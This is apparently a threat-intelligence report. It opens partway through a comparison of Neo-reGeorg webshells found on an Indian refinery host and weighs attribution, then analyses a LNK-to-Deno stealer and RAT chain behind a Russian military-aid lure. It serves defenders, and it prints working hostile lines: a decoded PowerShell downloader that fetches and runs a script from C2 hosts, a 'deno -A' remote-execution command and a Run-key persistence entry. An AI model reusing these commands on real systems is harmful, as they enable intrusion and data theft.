Structurally the two files are the same webshell. After normalisation, every structural marker matches: same six functions with the same signatures and roles, same four verb dispatch (CONNECT, DISCONNECT, FORWARD, READ), same 40-slot object[] info layout with slots 0 and 39 reserved for random padding, same slot semantics for indices 1 through 9, same optional HTTP-proxy branch on REDIRECTURL, same Application[MARK]-persisted socket, same 2-second BeginConnect timeout, and same 512 KiB READ cap. Renaming the X<n> placeholders back to their file 2 equivalents and diffing structural tokens against file 2 yields an empty diff. No code path exists in one file that is absent from the other.

The two files are not byte-copies of each other. They differ in three specific ways, all of which are per-build values that Neo-reGeorg's generator randomises on each run:

  • The additive constant K is 68903463 in file 2 and 1699217646 in file 3.
  • The de substitution alphabet is a different 64-character permutation in each file.
  • The GeorgHello banner decodes to a different <!-- <random> --> token in each file (<!-- NX3Ra+NGk7Ib... --> versus <!-- w75n/40s0sJS... -->).

It is highly likely both came from the same operator toolkit or the public Neo-reGeorg repo. The simplest interpretation is that the operator ran neoreg.py generate twice, producing two independent builds, then applied a different post-processing pipeline to each. File 2 was obfuscated with three techniques (Unicode escapes in identifiers, random noise comments, and dot-separator obfuscation on error strings). File 3 was mechanically renamed to X<n> placeholders and left otherwise clean. Neither file is a fallback derived from the other. They are two separate Neo-reGeorg endpoints planted on the same host across two consecutive days.

docs.title: Attribution - What the Tooling Suggests, and What It Does Not
docs.text: We now turn to the harder question: who dropped these files? The honest answer is that this artefact alone does not settle it. What follows is a hypothesis with its evidence and its caveats.

docs.title: The China hypothesis
docs.text:
Working hypothesis (low confidence): the intrusion sits inside the broad envelope of China-nexus targeting of Indian critical infrastructure, most plausibly by an intrusion set that habitually uses Neo-reGeorg as a post-exploitation tunnel.

The supporting evidence is twofold:

  • Tooling - borel.aspx and Content/borel.aspx reproduce, function-for-function, the ASP.NET template of L-codes/Neo-reGeorg, whose author publishes in Simplified Chinese. Neo-reGeorg is by no means China-exclusive, and it is open-source, mirrored widely, and used by red teams globally, but it is the standard tunnelling implant used in China-nexus intrusions across various security vendor datasets.
  • Target - BORL is a wholly-owned subsidiary of BPCL, a Government-of-India-owned refiner. Indian downstream oil-and-gas is a documented targeting priority for multiple China-nexus intrusion sets, coinciding with Chinese-state strategic interest in South Asian energy logistics and Indian Ocean supply chains. The shell's hardcoded SQL Server catalogue queries (see the borlapi.aspx targets SQL Server subsection) suggest the operator either knew or had scanned enough to know that the target stack was IIS plus MSSQL. This is a soft signal and should not be leaned on for attribution, but it mildly disfavours the fully opportunistic reading in which the operator drops a shell and only afterwards discovers what the box is running.

docs.title: What is Missing to Raise Confidence
docs.text:
The following items are absent from this sample:

  • No Chinese-language artefacts:
    • Zero CJK code points in any of the three ASPX files, no gb2312/gbk charset references, no Chinese-language comments.
  • No unique operator infrastructure:
    • No hard-coded C2 domain or IP, no key material tying to a known cluster, no user-agent string, no cookie name that resembles previously-published Neo-reGeorg configuration in the wild.
  • No hash overlap:
    • Neither the archive nor any of the three shells matches a known tracked indicator. In addition, VT lists no similar samples beyond another submission of the same file.
  • No knowledge of initial access:
    • We can see the shells but not the initial access. The archive does not include IIS logs, w3wp.exe process traces, or a captured exploit request.

docs.title: Alternative Hypotheses that Must be Kept Alive
docs.text:
Two other reasonable readings of the evidence deserve to remain on the board:

  • Opportunistic eCrime
    • The manual borlapi.aspx shell is generic WSO-lineage tooling routinely dropped by broad-scope scanning crews.
  • Iran-nexus opportunism
    • ASPX-shell activity against Indian entities has also been linked to Iran-nexus intrusion sets that pair IIS webshells with privilege-escalation tooling such as JuicyPotato (Fox Kitten). Nothing in the sample rules this reading out.

The archive as it stands is insufficient to distinguish these hypotheses. The tooling leans China-nexus and the sparse tradecraft is compatible with any of the three.

docs.title: Confidence statement
docs.text:
Working theory, held with low confidence: a China-nexus operator found an internet-facing BORL or BPCL host, exploited it, and dropped Neo-reGeorg on top to relay traffic back through the compromised server. This is the reading that requires the fewest assumptions. It is not the only reading that fits the evidence, and the artefact alone cannot rule out an eCrime crew or an Iran-linked one using the same open-source tooling.

  1. SensePost, "reGeorg," GitHub. https://github.com/sensepost/reGeorg ↩

  2. L-codes, "Neo-reGeorg," GitHub. https://github.com/L-codes/Neo-reGeorg ↩

  3. Analysis of the WSO 4.2.3 web shell, Medium. https://lylc-spearandshield.medium.com/web-shell-wso-4-2-3-740665a4e33a ↩

docs.title: A Padded LNK That Bootstraps a Deno-Based Loader Behind a Russian Military-Aid Lure
Summary
docs.text: In July 2026 I analysed a password-protected ZIP containing a single whitespace-padded LNK disguised as a Word document. The four-stage chain delivers a PowerShell downloader, installs the legitimate Deno runtime, and ultimately fetches a full stealer and remote-access agent capable of browser local-storage theft, screen capture, interactive shell, TCP tunnelling, and extensible module loading. The lure document is a Russian-language military-aid acceptance form, the campaign names are Russian (zapobedy, Варяг), and the agent's shell decoder uses the cp866 Russian OEM codepage. Taken together, these point to an operation targeting personnel in or adjacent to the Russian defence sector. The loader and agent match the DinDoor/DenoRAT platform documented by eSentire and attributed to the operator that Recorded Future’s Insikt Group tracks as TAG-150, though the affiliate handles and targeting in our sample differ from TAG-150's known operations, indicating a separate operator using the same builder.

docs.title: Key Takeaways
docs.text:
• The analysed sample is a malicious multi-stage loader produced by a Malware-as-a-Service builder. The loader and agent correspond to the DinDoor/DenoRAT platform.
  • The initial access relies on a .docx.lnk inside a ZIP whose command-line argument is front-padded with roughly 150 whitespace characters, a ZDI-CAN-25373-class trick that pushes the real, Base64-encoded PowerShell command out of the Explorer properties view.
  • The stage-3 loader abuses the legitimate, developer-signed Deno runtime as a living-off-a-trusted-tool execution engine, running remote JavaScript with deno -A (all permissions).
  • The stage-4 module it fetches is a fully self-contained stealer and RAT. All native Windows API access is performed through Deno's FFI (Deno.dlopen), with no compiled binary dropped to disk.
  • Targeting is consistent with Russian-speaking victims: the lure is a Russian military-aid acceptance document, the campaign names are Russian (zapobedy, Варяг), the shell output decoder uses the cp866 Russian OEM codepage, and the browser-theft user-enumeration function includes Russian-locale system directory names (Все пользователи, Общедоступные) so it works correctly on Russian-language Windows.

docs.title: Background
docs.text:
Malware that abuses a legitimate JavaScript runtime as its execution engine has become a distinct trend over the last year. Rather than shipping a compiled implant, an operator installs a signed, allowlisted runtime such as Deno, Bun or Node and runs attacker-controlled script through it, landing in a blind spot for defences tuned around PowerShell, Python or native binaries. Malwarebytes have tracked this shift closely and documented both a Bun-based initial infection vector and, in May 2026, a Deno backdoor pushed through fake software repositories.1 The Deno-based loader in this chain, publicly tracked as DinDoor,2 is a clear example: it pulls obfuscated JavaScript from its C2 and executes it under deno -A, leaving nothing compiled on disk.3

The initial-access half of the chain leans on a separate, well-documented technique: whitespace-padded LNK arguments (ZDI-CAN-25373) that push the real command out of Explorer's Properties view.4 The two combine into a chain that is living-off-signed-tooling from the first click through to the final agent.

docs.title: Lure Design and Targeting
docs.text: The sample arrived as АКТ приема передачи 16.07.2026.zip (SHA-256 1f479516c3ded8d827b83bea94ae14f3d8212552f107ccc548d572dd8334fcae). It contains exactly one file, АКТ приема передачи 16.07.2026.docx.lnk, a Windows shortcut whose double extension and imageres.dll icon make it look like a Word document in Explorer once the .lnk suffix is hidden. The archive name and, as we will see, the decoy content are Russian and military-themed. The lure is an "act of acceptance/transfer" (акт приёма-передачи) dated 16 July 2026, that apparently links to the sort of routine logistics paperwork exchanged inside Russian volunteer military-aid networks.

docs.title: Delivery Mechanism
docs.text:
The shortcut itself is the first-stage dropper. Its target is powershell.exe, stored indirectly in the LNK's Environment Variable Data block as %windir%\system32\WindowsPowerShell\v1.0\powershell.exe, and its window style is SW_SHOWMINNOACTIVE, so nothing visible flashes on screen (Figure 1). The interesting part is the argument string: it opens with roughly 150 newline and tab characters before the real command begins (Figure 2). This is the ZDI-CAN-25373 padding technique,4 the shortcut's argument field accepts up to 4096 characters while the Explorer "Target" box only surfaces the first ~260, so an analyst inspecting Properties sees blank space and the malicious command hides past the edge (Figure 2).

Figure 1: ShowWindow Function Displays the Window as a Minimised Window Figure 2: Content of the АКТ приема передачи 16.07.2026.docx.lnk File

Stripping the padding leaves a compact PowerShell invocation, -NoP -W Hidden -ep bypass -EncodedCommand <base64>, whose Base64 blob is UTF-16LE. Decoding it gives the whole first stage in one line (Figure 3):

Figure 3: The Decoded First-Stage Downloader, Three C2 Hosts and a `%TEMP%` Drop 
$387s=@('hxxp://195.133.53[.]98:80','hxxp://13.140.8[.]25:80','hxxp://78.153.149[.]152:80')
foreach($66 in $387s){
  try{
    $q4w=("$env:TEMP"+"\923d7a6fb5970da6.ps1")
    &('InVoKe'+'-'+'WeB'+'ReQuEsT') -Uri ("$66"+"/923d7a6fb5970da6.ps1") `
        -OutFile $q4w -TimeoutSec 3 -UseBasicParsing -ea Stop | Out-Null
    if(&('TeSt'+'-P'+'aTh') $q4w){ &('PoWe'+'rSh'+'ELL') -NoP -ep bypass -File $q4w; exit 0 }
  } catch{ }
}
exit 1

In short, the LNK loops over three hard-coded hosts, downloads 923d7a6fb5970da6.ps1 into %TEMP%, and, if the file lands, executes it with a fresh, hidden PowerShell before exiting. It is still not sure if the 923d7a6fb5970da6 string is the campaign build identifier and recurs at every subsequent layer. We will leave this for future observations.

docs.title: The Stage-2 PowerShell Installer
docs.text:
The downloaded script (served content SHA-256 277c6ee45a6799a7144cac610c04127fcc266db30115ae5771b90b4d7b64ce1a) is a PowerShell installer script.

Figure 4: `Phase-RunLauncher` in the Stage-2 Script Invoking `deno -A` Against the Remote Loader (Partial representation of the 923d7a6fb5970da6.ps1 script)

The script is the second stage of an LNK-initiated chain. It runs in two independent halves. The first half is the social engineering leg and runs unconditionally. It resolves the current working directory via gl, substituting %TEMP% if that resolves to the System directory, then retrieves hxxp://<C2>/923d7a6fb5970da6/fake and writes it as АКТ приема передачи 16.07.2026.docx. Before launching it, the script deletes "<path>.docx.lnk", which recovers the original lure filename and confirms the delivery vector from the script alone. The file is then opened with Start-Process, so execution passes to whatever handler is registered for .docx on the host.

Figure 5: АКТ приема передачи 16.07.2026.docx Fetching from C2s

The second half stands up the execution environment. A named mutex Global\923d7a6fb5970da6 gates this section only, so a repeat execution still re-fetches and re-opens the lure. It then installs the legitimate Deno runtime to $Home\.deno\bin\deno.exe, preferring the vendor URL hxxps://dl.deno[.]land/release/v2.7.14/deno-x86_64-pc-windows-msvc.zip with five attempts and exponential backoff (Figure 4), and falling back to hxxp://<C2>/d (Figure 6). Validation is file size only, 40 MB for the archive and 115 MB for the extracted binary, with no hash or Authenticode check.

Figure 6: Download-Deno and Phase-InstallDeno Functions

The terminal action is the point of the whole script (Figure 7):

Start-Process deno.exe -ArgumentList '-A "hxxp://<C2>/923d7a6fb5970da6.js"'

-A is --allow-all, disabling Deno's permission model in full. Deno fetches and executes the launcher directly from the URL, so stage three never touches disk. The operator has used a signed, legitimately obtained interpreter to achieve fileless remote script execution, moving the remaining chain out of PowerShell and away from AMSI and script block logging. Everything before this line exists to make this line work.

Figure 7: Start of the deno.exe Process

Supporting behaviours worth surfacing

Progress is beaconed to hxxp://<C2>/<build id>/install-status as compact JSON at every phase transition (Figure 8). The body carries a per-run eight-character CorrelationId and, where relevant, the list of C2 URLs that failed to answer from the victim's vantage point, and the script reorders its host list in memory to favour whichever node responds first.

Figure 8: Script Status Logic

Cleanup-TempFiles targets %TEMP%\923d7a6fb5970da6.ps1, confirming the loader stages itself to TEMP under the build ID. Cleanup runs only on the failure exits, so a successful install leaves the .ps1 on disk.

Figure 9: Cleanup-TempFiles Function Logic

docs.title: The Decoy Document
docs.text:
While the loader installs itself, the victim is shown АКТ приема передачи 16.07.2026.docx (SHA-256 0f11a871e35972215f12d2778ebf59f57db04df8915fc59707a080a1985184e2). I confirmed it is inert, no VBA or XLM macros, no remote-template or external OLE relationships, metadata stripped, so its only role is social proof. Its content is a Russian-language "Act of property transfer" (Акт передачи имущества, №27359) from a purported charity «Центр помощи СВО "ZaПобеду"» donating materiel, generators, DJI Mavic 3 Pro drones, "Filin" UAVs, camouflage nets, buck converters, "for the needs of a Russian Ministry of Defence unit". The zapobedy campaign tag inside the loader's token is a transliteration of this «ZaПобеду» ("ForVictory") theme.

Figure 10: The Benign Decoy, a Russian «ZaПобеду» Military-Aid Property-Transfer Act

docs.title: The Stage-3 Deno Loader (DinDoor)
docs.text:
Once running, the sample keeps a single copy of itself alive on the host, selects one of three operator-controlled servers, and repeatedly downloads JavaScript from that server and executes it in a new Deno process with every permission granted. It carries no capability of its own. There is no collection, no credential access, no reconnaissance beyond the two values it needs to name itself, and no command interpreter except the one it spawns to install its own persistence. What the intrusion ultimately does to a victim is determined entirely by what the server returns, and that response was not captured.

The file retrieved from hxxp://<C2>/923d7a6fb5970da6.js (SHA-256 4a4f863da734b438dd2d1ca90964889cd28cd78bbddd8ffa6475b13615aa5e0e) is obfuscated in the obfuscator.io style, with a shuffled constant string-array behind a hex-arithmetic index decoder, so no string in it is readable as written (Figure 11). The deoubfuscated script is presented in the appendix.

Figure 11: Obfuscated Stage 3

docs.title: Execution Control
docs.text:
The loader prevents a second copy of itself from running by claiming a fixed local TCP port when it starts, and terminating quietly with a success status if another copy already holds it. It never accepts a connection on that socket, so it looks like the port serves only as a lock and carries no traffic.

In other words, the loader calls Deno.listen on 127.0.0.1:61488 and exits silently on AddrInUse (Figure 12). f10 binds TCP 127.0.0.1:61488 and returns false on Deno.errors.AddrInUse. The caller exits with status 0 when the bind fails. The listener handle is stored in v19 and never accepted on, so no connection is ever serviced. Its only role is to hold the port for the process lifetime.

Figure 12: Holding the 61488 Port for the Process Lifetime

The handle in v19 is never referenced again and the file contains no accept call, which is what distinguishes a lock from a service.

docs.title: Victim Identification and Artefact Naming
docs.text:
The loader identifies the infected host twice, by two different routines, for two different consumers. One identifier travels to the C2 in the x-huid header so the operator can distinguish victims across the campaign (Figure 13). The other names every file and registry value the loader writes to the host (Figure 14). They are computed from different inputs and are not interchangeable, and treating them as one identifier will cost hunting coverage.

Figure 13: Routine f6/f7 Constructing the `x-huid` Identifier from USERNAME + Deno.hostname() Figure 14: Routine f8/f9 hashing USERNAME only to Establish Persistent Filenames and Registry Entries

docs.title: Persistence
docs.text:
The loader survives reboot by writing two hidden copies of itself into the user profile and adding a logon entry that relaunches 2 of them through the Deno runtime stage two installed. It attempts this up to 9 times, two seconds apart, and then continues to its main loop whether or not any attempt succeeded, so persistence is best effort and does not gate execution (Figure 15).

Figure 15: Loop 0 to 8 (9 times)

On first run the loader exists only in memory, having been executed straight from a URL, so it cannot copy itself from disk (Figure 16).

Figure 16: No Authorisation Header or x-* Headers Included Making it Look Like a Standard, Unauthenticated HTTP GET Request

It detects this and downloads its own source from the C2 a second time in order to write the on-disk copy. That request carries no headers and no token, unlike every other request the loader makes.

It leaves three artefacts:

%APPDATA%\<usernameHash>.js                    hidden, launcher
%LOCALAPPDATA%\Microsoft\<usernameHash>.js     hidden, second copy
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<usernameHash>

The logon entry runs conhost.exe --headless "<deno.exe>" -A "<launcher>". The --headless switch suppresses the console window that Deno would otherwise show at logon. The Deno path is the one stage two installed under the user profile, so the entry breaks if that runtime is removed. All three artefacts are written by a hidden PowerShell child process the loader spawns, rather than through Deno's own filesystem and registry APIs, which inverts the chain: PowerShell starts Deno at stage two, and Deno starts PowerShell at stage three (Figure 17).

Malwarebytes recorded a byte-for-byte equivalent logon entry, conhost.exe --headless "<deno.exe>" -A "%APPDATA%\<hash>.js", in a campaign with a completely unrelated delivery vector.1 The persistence mechanism is therefore a builder default rather than an operator choice, which is good news for detection: a rule written against this pattern should generalise across every operator on the platform.

Figure 17: Headless Logon Entry Command + Spawned PowerShell and Chain Inversion

docs.title: Server Selection
docs.text:
The loader chooses which of its three servers to use by probing all three at once and keeping whichever answers first, rather than walking the list in order (Figure 18). A server qualifies only if it responds within three seconds with a body that trims to the literal ok (Figure 19). Malwarebytes observed the same convention on the platform, a /health endpoint whose only job is to return ok, so this too is builder-level behaviour rather than something specific to this campaign.1

Figure 18: Parallel Probing and Race Condition

Promise.any() executes all probe requests simultaneously and resolves as soon as any single probe promise successfully fulfils.

Figure 19: Qualification Criteria (3-Second Timeout and "ok" Body)

The selection is cached for as long as requests succeed, and is discarded in favour of the next entry in the list after any failure. The probe carries no headers and no token, so it is anonymous and gives the server nothing to fingerprint.

docs.title: Module Retrieval and Execution
docs.text:
The operator delivers capability to the host by returning JavaScript in the body of a single authenticated request (Figure 20). The loader writes that response to the temp directory under the naming hash and runs it as a child Deno process with all permissions granted, then waits for it to exit.

The request is a GET to <base>/event carrying five headers.

Figure 20: Delivery via Authenticated Single GET Request

The loader sends no host survey, parses no command structure, and offers the server no choices. Everything the server needs in order to decide what to deliver is in the token and the three identity headers, and the response body is itself the instruction.

docs.title: Telemetry
docs.text:
The loader carries a channel for reporting its own execution back to the operator, and in this build that channel is switched off and transmits nothing (Figure 21).

Figure 21: Switched-Off Logging

The switch initialises to false, the logging method returns before it records anything, and the method that would enable it is defined but never called anywhere in the file. Its thirty-second upload timer therefore runs with an empty cache and never fires a request (Figure 22).

Figure 22: Silent Heartbeat Timer

The destination is resolved once when the object is constructed, at which point no server has been selected, so it pins permanently to the first entry in the list, 195.133.53[.]98, and does not follow failover (Figure 23).

Figure 23: C2 Host Pinning

Because this.url is evaluated only once inside the constructor() during script load (when v3 is still null), this.url is set to "hxxp://195.133.53[.]98:80/agent-exec-logs". When f2() later runs and updates v3 with a surviving C2 node, this.url is never updated. If 195.133.53[.]98 goes offline and failover switches the main C2 loop to another server, any subsequent attempt to transmit logs would still target 195.133.53.98.

Figure 24: Missing Failover Logic

Overall, the loader controls its own instancing, persists itself, identifies the victim, selects a server, retrieves code and executes it with full privileges. It does not check for virtualisation or analysis tooling, does not resist debugging beyond its obfuscation, does not escalate privilege, does not disable or evade security tooling beyond the interpreter substitution inherited from stage two, does not access credentials, and does not collect or stage victim data. It applies no transport encryption; every request derives from the three hard-coded base URLs and is cleartext HTTP on port 80. The only environment values it reads anywhere are USERNAME, USER, TEMP, TMP, TMPDIR, APPDATA and LOCALAPPDATA, all consumed for naming, which bounds the reconnaissance claim precisely.

docs.title: The Stage-4 Payload: A Modular Stealer and Remote-Access Agent (DenoRAT)
docs.text:
At the time of the initial write-up, the module fetched from /event was the single thing I could not see: the chain resolves to whatever JavaScript the server elects to return, and on my first attempts that response never arrived. I closed the gap by treating the loader's own protocol as the specification for a client of my own. Passive sources offered nothing, and every sandbox that had executed the family recorded no network traffic whatever, so the module had to be retrieved live.

The build dissected above was already burned: its hard-coded token now answers Invalid token, the operator having evidently revoked it once the sample became public (my guess). A sibling build from the same panel (e5173682ca73f8f3, affiliate handle Social, the «Варяг» campaign) was still serving, and its token carried a newer accessTokenHash claim the panel had begun to require; replaying its exact request - a single authenticated GET to /open over a scrubbed egress - returned a 216 KB obfuscated Deno module. That module is precisely the answer the loader's design withholds, and it is no downloader: it is a fully-featured credential stealer and remote-access agent. The remainder of this note covers how it was retrieved and, once deobfuscated, what it is built to do.

The retrieved module (SHA-256 6d2465faee7e0153d6d41886d88d52d0b1d70e422d798e1a650b67f074edf281, 221,470 bytes, obfuscated) was deobfuscated with webcrack and yields a 4,509-line Deno script. The first 1,662 lines are a bundled JPEG codec (jpeg-js), which the screenshot subsystem uses to compress captured frames before exfiltration. Everything from line 1,663 onward is the agent's own logic.

docs.title: Server Selection
docs.text:
The module inherits the same two-server pool and health-probe pattern from the stage-3 loader. On initialisation it contacts both servers in parallel and keeps whichever responds first with "ok" within three seconds. If no server answers, it rotates through the list on each subsequent failure. The event-service endpoint, which replaces the stage-3 /event path, is constructed by appending /event-service to the winning base URL (Figure 25).

Figure 25: Server Pool and /event-service Endpoint Construction

docs.title: Browser Local Storage Theft
docs.text:
The agent targets browser local storage, not saved passwords or cookies. It enumerates every user profile on every mounted drive, then walks the Local Storage\leveldb folder inside each profile directory of eight Chromium-based browsers and Firefox (Figure 26).

Figure 26: Browser Profile Enumeration

The targeted browsers and their User Data paths are:

Browser AppData Path Chrome %LOCALAPPDATA%\Google\Chrome\User Data Edge %LOCALAPPDATA%\Microsoft\Edge\User Data Brave %LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data Vivaldi %LOCALAPPDATA%\Vivaldi\User Data Yandex %LOCALAPPDATA%\Yandex\YandexBrowser\User Data Opera %APPDATA%\Opera Software\Opera Stable OperaGX %APPDATA%\Opera Software\Opera GX Stable Iridium %LOCALAPPDATA%\Iridium\User Data Firefox %APPDATA%\Mozilla\Firefox\Profiles (recursive leveldb search)

For each discovered profile, it finds the newest .log file in the leveldb directory by modification time, copies it into a staging directory at C:\ProgramData\MicrosoftWindows.Client.CBS_cws5n1h2txyewyftrg, reads the copy, and deletes it after transmission.

Figure 27: Copying .log into a Staging Folder

The exclusion list includes the Russian-locale system directory names (Все пользователи, Общедоступные) alongside their English equivalents, consistent with the Russian-targeting established by the lure and the cp866 text decoder, ensuring the stealer correctly skips non-user directories regardless of the victim's display locale:

Figure 28: Skipping User Windows Default System Profiles

docs.title: Screen Capture
docs.text:
The agent captures the entire virtual screen using one of two paths, selected at runtime based on the process identity (Figure 29). If it detects that it is running as SYSTEM, it uses an indirect method that schedules the capture in the logged-on user's interactive session. Otherwise it captures directly through the Windows GDI API via Deno FFI. FFI stands for Foreign Function Interface. It's a mechanism that lets code written in one language call functions from libraries written in another language, typically compiled native code (C/C++ DLLs on Windows, .so on Linux).

In this malware's case, the agent is JavaScript running inside the Deno runtime. JavaScript by itself cannot call Windows API functions like BitBlt or GetDesktopWindow. Deno's FFI feature (Deno.dlopen) bridges that gap. It loads a native DLL into memory and exposes its exported functions as callable JavaScript objects.

Figure 29: Screen Capture Code Logic

docs.title: Interactive Terminal (PTY Reverse Shell)
docs.text:
The agent provides a full interactive terminal to the operator by importing a third-party FFI-based pseudo-terminal library at runtime from jsr.io, the Deno package registry (Figure 30).

Figure 30: Interactive Terminal Code Logic

The PTY session is started when the operator sends a pty-start WebSocket message specifying the session ID and terminal dimensions (columns and rows). The agent spawns powershell.exe with -NoLogo -NoProfile -ExecutionPolicy Bypass, resizes the PTY to the requested dimensions, and begins streaming output back through the WebSocket as pty-output messages. The operator types by sending pty-input messages. The session idles out after 30 minutes (1,800,000 ms) and is cleaned up automatically.

Figure 31: Session Cleanup Logic

docs.title: Remote Module Loader
docs.text:
Beyond the built-in capabilities, the agent can fetch and execute additional modules from the C2 on demand. When the operator sends a remote-module task, the agent requests <C2>/agent-modules/<name>.ts with the standard authorisation headers, wraps the response body in a Blob URL, dynamically imports it, and calls its run() export.

Figure 32: Remote Module Loader Code Logic

docs.title: System Fingerprinting and AV Awareness
docs.text:
AV detection is handled by a dictionary of 211 process image names mapped to 53 product families, covering every major endpoint product from Microsoft Defender and Kaspersky through CrowdStrike Falcon, SentinelOne, and Elastic Security. If a running process does not match the dictionary, a heuristic regex catches names containing keywords like antivirus, crowdstrike, sentinelagent, or elastic-endpoint, while an exclusion regex prevents false positives on system processes such as svchost, explorer, and csrss.

Figure 33: The AV Process Dictionary (Partial View)

docs.title: Command Dispatch and the Dual C2 Channel
docs.text:
The agent operates in two communication modes. On startup it polls the C2 over HTTP and can optionally upgrade to a persistent WebSocket connection when the server instructs it. The first HTTP poll carries an x-status: boot header so the server knows the agent just started.

The server's response to each poll includes a configuration block that controls the poll interval, whether logging is enabled, whether live (WebSocket) mode should be activated, and whether automatic sysinfo collection is on. When live mode is activated, the agent opens a WebSocket to the same /event-service path (rewritten from http:// to ws://) and switches to event-driven dispatch. If the WebSocket drops, the agent retries with exponential backoff starting at 1 second and capping at 30 seconds.

Figure 34: Dual C2 Channel Code Logic

The command dispatcher (Mr) handles six task types:

Task type Method What it does exec cmd /c <script> Run a shell command, decode output as cp866 exec-ps powershell -NoProfile -NonInteractive Run a PowerShell command sysinfo Ar() Collect full host fingerprint screenshot lr() Capture virtual screen as JPEG agent-exit Deno.exit(<code>) Terminate the agent (300 ms delay) remote-module xr(<name>) Fetch and run a server-side module

The exec task hardcodes its output decoder to cp866, the character encoding Windows uses as the default console codepage on Russian-locale installations. When cmd.exe runs on a Russian Windows machine, it produces output encoded in cp866. The agent decodes those bytes back into readable Cyrillic text for the operator. On an English-locale machine, the console would output in codepage 437 (Latin), and decoding it as cp866 would produce garbled text. The developer does not detect the codepage at runtime or fall back to UTF-8, which is what a broadly targeted agent would do. Instead they bake in the assumption that the console speaks Russian. Together with the Russian-locale system directory names in the browser-theft skip list, this is a second independent indicator that the agent was built for a known target environment, not for opportunistic wide deployment.

docs.title: Startup and Anti-Forensics
docs.text:
Before contacting the C2, the agent clears the Deno runtime's local cache by deleting the remote and gen subdirectories under %LOCALAPPDATA%\deno. This removes cached copies of previously fetched remote modules and generated artifacts, ensuring that any module the operator served in a prior session does not persist on disk and cannot be recovered from the cache after the agent exits.

Figure 35: Deno Cache Clearing Code Logic

Overall, the stage-4 module is a fully self-contained remote-access agent with credential theft, screen capture, interactive shell, TCP tunnelling, file management, host fingerprinting, and extensible module loading. The browser-theft function runs automatically every 15 minutes (setInterval(gs, 900000)), not only on operator command. The cp866 text decoder and the Russian-locale system directory names in the profile exclusion list are consistent with an agent built to operate on Russian-language Windows installations.

It is worth being precise about where this build sits in the platform's range, because it is not the top tier. Malwarebytes analysed a considerably fatter variant of the same agent: full bidirectional control through a custom VNC implementation over WebSocket, more than fifty crypto-wallet extensions plus ten wallet software folders, Telegram, Discord and Lightcord theft, clipboard capture and modification, SOCKS5 tunnelling, and a peer-to-peer streaming mode that spawns a hidden Microsoft Edge process, drives it over the Chrome DevTools Protocol, and relays H.264 screen frames straight to the operator over a WebRTC DataChannel so the video never crosses the C2 at all.1 They also found a cut-down agent-lite build supporting only a handful of commands and fronted by Cloudflare Workers. Against that spread, our sample's leveldb-only browser theft looks like a deliberately narrow build rather than the platform's ceiling, which strengthens the build-tier reading of the missing NightshadeC2 component discussed below.

docs.title: Related Reporting
docs.text:
The loader and agent architecture, JWT claim structure, task-type vocabulary, persistence mechanism, and browser-target list in this sample closely match the DinDoor/DenoRAT platform described in eSentire's July 2026 reporting.3 That activity is attributed to TAG-150, a designation from Recorded Future's Insikt Group for an operator active since at least March 2025 (Recorded Future has since renamed the cluster GrayBravo). The table below summarises the alignment.

Feature Our sample eSentire TAG-150 Runtime Deno with -A Deno with -A JWT claims buildId, buildNote, userId, userNote, accessTokenHash Identical field set Persistence HKCU\Run\<hash> running deno -A <hash>.js Same pattern Task types exec, exec-ps, screenshot, pty-start/input/resize/close Identical Screenshot user32/gdi32 FFI to JPEG Same Browser targets Chrome, Edge, Brave, Opera, OperaGX, Vivaldi, Yandex, Firefox Same families Obfuscation obfuscator.io obfuscator.io AV enumeration 211-entry process-name dictionary Directory-path check (24 products) Remote module load Dynamic import of .ts from C2 Dynamic import of .mjs from C2

Key differences suggest a different build configuration and operator, not a different platform:

Our sample TAG-150 (eSentire) Initial access LNK with ZDI-CAN-25373 whitespace padding ClickFix social engineering with MSI Affiliate handles DvaNul, Social Smokest (reported as a config-derived value rather than a confirmed handle) Targeting Russian-language military-aid lure Generic ClickFix prompt C2 endpoint /event-service (HTTP + WebSocket) /message-event (HTTP only) Browser theft depth Leveldb local-storage logs only Full credential, cookie, crypto-wallet theft with ABE bypass SOCKS proxy Present Not documented Additional payload None observed NightshadeC2 via Python shellcode loader "Onyx" reference OnyxScreenDpi in inline C# Not mentioned

The affiliate handles and lure theme indicate our sample was deployed by a separate operator purchasing access to the same builder. The operator eSentire observed is tracked as TAG-150 (active since at least March 2025). Our operator is unattributed but targets the Russian defence sector, a target set not associated with TAG-150's known campaigns. The NightshadeC2 component documented by eSentire (a compiled RAT delivered via a Python reflective loader) was not present in our chain, which may reflect a different build tier, a newer or older platform version, or simply operator preference.

A third public data point makes the shared-builder reading considerably harder to argue with. In May 2026 Malwarebytes published excellent work on the same DinDoor backdoor reaching victims through an entirely unrelated route: fake installers and plugins impersonating ChatGPT, Claude, ZENOLOGY, Ableton Live, AutoTune and Kontakt, hosted on GitHub and SourceForge, with traffic driven to them by compromised YouTube channels carrying AI-generated videos.1 Their chain also diverges from ours well past initial access. Where our stage two downloads the Deno runtime straight from the vendor with a C2 fallback, theirs installs the Scoop package manager, uses Scoop to obtain WinGet, and then has WinGet install Deno from the official package source, an approach that leaves the operator with two general-purpose software installers on the victim host as a bonus. Their loader is also split into a small launcher-1 eval loop that pulls a larger launcher-2, and later stages are piped through deno run -A --no-check - via stdin so they never touch disk at all.

Three independent reports, three unrelated initial-access vectors, one platform. That is the clearest possible evidence that DinDoor is sold or shared as a builder and that delivery is left entirely to the buyer, which is precisely why detections anchored on the LNK, the ClickFix prompt, or the fake-installer repository will each miss the other two, and why the durable detection surface is the Deno persistence entry and the C2 protocol rather than the lure.
